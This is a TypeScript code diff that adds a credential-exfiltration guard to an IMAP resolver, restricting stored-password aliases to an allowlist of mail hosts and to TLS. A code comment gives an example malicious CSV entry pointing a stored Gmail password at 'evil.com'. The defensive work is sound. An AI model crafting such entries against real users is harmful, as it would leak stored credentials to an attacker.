@@ -65,6 +65,50 @@ export interface ImapResolverOptions {
   settings?: () => EmailCodeSettings;
   /** imapflow client factory — tests inject a fake. */
   imapClientFactory?: ImapClientFactory;
+  /** Extra IMAP hosts trusted with `@alias` passwords (stored accounts' hosts). */
+  trustedHosts?: () => string[];
+}
+
+/**
+ * SEC-1: an `@alias` (stored secret) used as an IMAP credential is only sent
+ * to a host the operator can be presumed to trust — the big mail providers,
+ * loopback (AYCD Inbox's local IMAP Server), or a host they added in
+ * Settings → Integrations. A third-party CSV naming `imap:evil.com:993:…
+ * :@gmailpw:…` gets #BAD ALIAS instead of the password.
+ */
+export const TRUSTED_IMAP_HOSTS = [
+  "imap.gmail.com",
+  "outlook.office365.com",
+  "imap-mail.outlook.com",
+  "imap.mail.yahoo.com",
+  "imap.mail.me.com",
+  "imap.aol.com",
+  "imap.zoho.com",
+  "127.0.0.1",
+  "localhost",
+  "::1",
+];
+
+function aliasHostRefusal(
+  host: string,
+  tls: boolean,
+  usedAliases: string[] | undefined,
+  extra: (() => string[]) | undefined,
+): string | null {
+  if (!usedAliases || usedAliases.length === 0) return null;
+  const h = host.toLowerCase().replace(/^\[|\]$/g, "");
+  const trusted = [...TRUSTED_IMAP_HOSTS, ...(extra?.() ?? []).map((x) => x.toLowerCase())];
+  if (!trusted.includes(h)) {
+    return `#BAD ALIAS @${usedAliases[0]} is only sent to known mail hosts — add ${h} under Settings → Integrations to trust it`;
+  }
+  // Audit: the CSV picks the port; a stored password must not go out in
+  // the clear to a remote host (STARTTLS can be stripped). Loopback (AYCD's
+  // local IMAP Server) is exempt — it never leaves the machine.
+  const loopback = h === "127.0.0.1" || h === "localhost" || h === "::1";
+  if (!tls && !loopback) {
+    return `#BAD ALIAS @${usedAliases[0]} is only sent over TLS (use port 993) to ${h}`;
+  }
+  return null;
 }
 
 /**
@@ -337,6 +381,8 @@ export function registerImapResolver(
         return err instanceof Error ? err.message : String(err);
       }
       if (form) {
+        const refusal = aliasHostRefusal(form.creds.host, form.creds.tls, ctx.usedAliases, options.trustedHosts);
+        if (refusal) return refusal;
         const settings = options.settings?.() ?? DEFAULT_EMAIL_CODE_SETTINGS;
         return runEmailCodePipeline({
           parsers: options.parsers,
@@ -357,6 +403,8 @@ export function registerImapResolver(
       return err instanceof Error ? err.message : String(err);
     }
     const { host, port, tls, user, pass, query } = parsed;
+    const refusal = aliasHostRefusal(host, tls, ctx.usedAliases, options.trustedHosts);
+    if (refusal) return refusal;
     const connect = options.connect ?? defaultImapConnect;
     let session: ImapSession | null = null;
     try {
